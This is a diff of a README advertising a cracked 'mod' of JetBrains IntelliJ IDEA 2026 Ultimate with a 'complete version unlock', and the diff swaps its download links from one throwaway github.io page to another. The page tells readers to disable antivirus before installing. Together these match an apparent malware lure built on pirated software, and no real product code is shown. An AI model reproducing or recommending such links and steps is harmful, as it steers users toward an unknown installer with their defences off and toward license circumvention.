@@ -2,7 +2,7 @@
 
 JetBrains IntelliJ IDEA 2026 Ultimate Edition is a comprehensive mod tool designed to elevate your coding experience on Windows 10/11. This package integrates premium plugins, performance optimizations, and complete version unlock, making it ideal for developers seeking efficiency and advanced features in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Setup-latest15.07-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Setup-latest15.07-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 - **Premium Plugin Pack**: Access over 20 curated plugins for Java, Kotlin, and other languages, enhancing code analysis and productivity.
@@ -47,7 +47,7 @@ Ensure you have a stable internet connection, disable antivirus temporarily, and
 - **Performance Issues**: Adjust memory settings in idea.vmoptions file or contact support for further assistance.
 
 ## Download
-For the latest version and updates, please visit the [official download page](https://yellowtaxisave.github.io/download-page/).
+For the latest version and updates, please visit the [official download page](https://capitals-707-bringing.github.io/download-page/).
 
 ## Changelog
 - **Version 2026.1**: Initial release with full plugin pack and performance enhancements.
